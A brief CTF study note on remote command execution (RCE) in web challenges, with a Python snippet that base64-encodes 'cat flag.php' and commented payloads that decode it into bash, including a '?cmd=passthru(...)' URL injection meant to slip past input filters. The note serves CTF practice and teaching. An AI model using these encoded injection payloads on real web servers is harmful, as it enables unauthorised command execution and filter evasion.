# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/命令执行.md
# TITLE: 什么是rce
# CATEGORY: web

import base64
S = b'cat flag.php'
e64 = base64.b64encode(S)  #参数s的类型必须是字节包（bytes）
print(e64)
# echo Y2F0IGZsYWcucGhw | base64 -d | bash
# `echo Y2F0IGZsYWcucGhw | base64 -d`
# $(echo Y2F0IGZsYWcucGhw | base64 -d)
# ?cmd=passthru('`echo Y2F0IGZsYWcucGhw | base64 -d`')
